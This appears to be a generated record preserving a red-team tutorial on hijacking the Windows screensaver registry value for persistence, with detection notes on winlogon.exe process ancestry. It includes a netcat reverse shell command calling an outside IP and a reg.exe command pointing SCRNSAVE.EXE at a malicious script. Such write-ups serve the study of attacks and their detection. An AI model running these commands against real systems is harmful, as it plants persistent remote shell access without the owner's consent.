---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Screensaver Hijack

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1180-screensaver-hijack` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1180-screensaver-hijack.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

To achieve persistence, the attacker can modify SCRNSAVE.EXE value in the registry  HKCU\Control Panel\Desktop\ and change its data to point to any malicious file.&#x20;

## Preserved Body

````markdown
## Execution

To achieve persistence, the attacker can modify `SCRNSAVE.EXE` value in the registry  `HKCU\Control Panel\Desktop\` and change its data to point to any malicious file.&#x20;

In this test, I will use a netcat reverse shell as my malicious payload:
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
Let's update the registry:

![](<../../_assets/screensaver-registry.png>)

The same could be achieved using a native Windows binary reg.exe:
```bash
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\shell.cmd
```
![](<../../_assets/screensaver-reg.png>)

## Observations

Note the process ancestry on the victim system - the reverse shell process traces back to winlogon.exe as the parent process, which is responsible for managing user logons/logoffs. This is highly suspect and should warrant a further investigation:

![](<../../_assets/screensaver-shell (1).png>)

![](<../../_assets/screensaver-logs.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/screensaver-hijack.md)

## Evidence Excerpt

```text
_asset_filenames:
- screensaver-logs.png
- screensaver-reg.png
- screensaver-registry.png
- screensaver-shell (1).png
_body: '---
description: Hijacking screensaver for persistence.
---
```
